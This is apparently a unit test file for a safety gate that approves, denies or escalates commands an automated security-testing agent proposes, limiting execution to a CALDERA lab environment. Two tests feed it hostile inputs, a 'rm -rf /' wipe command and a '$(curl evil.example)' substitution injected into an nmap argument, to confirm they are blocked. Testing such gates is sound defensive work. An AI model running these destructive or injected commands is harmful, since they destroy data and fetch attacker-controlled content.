"""Unit tests for the pre-execution safety gate."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from oubliette_warden.agents.codegen.base import (  # noqa: E402
    AttackTechnique,
    Command,
    ExecutionEnv,
)
from oubliette_warden.agents.codegen.safety_gate import (  # noqa: E402
    GateDecision,
    Verdict,
    evaluate,
)


def _cmd(
    *,
    adapter: str = "nmap",
    argv: list[str] | None = None,
    impact: bool = False,
    runtime: int = 60,
    targets: list[str] | None = None,
) -> Command:
    return Command(
        adapter_name=adapter,
        argv=argv if argv is not None else ["nmap", "-sV", "10.0.0.1"],
        target_scope=targets if targets is not None else ["10.0.0.1"],
        attck_tactics=[AttackTechnique.IMPACT] if impact else [AttackTechnique.RECONNAISSANCE],
        attck_technique_ids=["T1499"] if impact else ["T1595"],
        is_active_probe=True,
        expected_runtime_seconds=runtime,
        rationale="test",
    )


def test_approves_well_formed_command():
    decision = evaluate(_cmd(), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.APPROVE
    assert all(s.verdict == Verdict.APPROVE for s in decision.stages)


def test_denies_non_caldera_env():
    decision = evaluate(_cmd(), ExecutionEnv.LIVE)
    assert decision.final == Verdict.DENY
    assert any("CALDERA_ONLY" in s.reason for s in decision.stages)


def test_denies_impact_class():
    decision = evaluate(_cmd(impact=True), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.DENY
    assert any("Impact" in s.reason for s in decision.stages)


def test_denies_empty_argv():
    decision = evaluate(_cmd(argv=[]), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.DENY


def test_denies_empty_target_scope():
    decision = evaluate(_cmd(targets=[]), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.DENY


def test_denies_dangerous_substring():
    decision = evaluate(
        _cmd(argv=["bash", "-c", "rm -rf /"]),
        ExecutionEnv.CALDERA_ONLY,
    )
    assert decision.final == Verdict.DENY
    assert any("forbidden token" in s.reason for s in decision.stages)


def test_denies_shell_substitution():
    decision = evaluate(
        _cmd(argv=["nmap", "$(curl evil.example)"]),
        ExecutionEnv.CALDERA_ONLY,
    )
    assert decision.final == Verdict.DENY


def test_escalates_unknown_adapter():
    decision = evaluate(_cmd(adapter="rogue_tool"), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.ESCALATE
    assert any(s.stage == "rag_guard" for s in decision.stages)


def test_escalates_long_runtime():
    decision = evaluate(_cmd(runtime=3600), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.ESCALATE


def test_short_circuits_on_first_deny():
    decision = evaluate(_cmd(targets=[]), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.DENY
    # pre_filter denies, so we should NOT have reached the later stages
    stages_run = {s.stage for s in decision.stages}
    assert stages_run == {"pre_filter"}


def test_decision_records_all_stages_when_approving():
    decision = evaluate(_cmd(), ExecutionEnv.CALDERA_ONLY)
    stages_run = [s.stage for s in decision.stages]
    assert stages_run == ["pre_filter", "pattern_detector", "rag_guard", "llm_judge", "mcp_guard"]
    assert isinstance(decision, GateDecision)
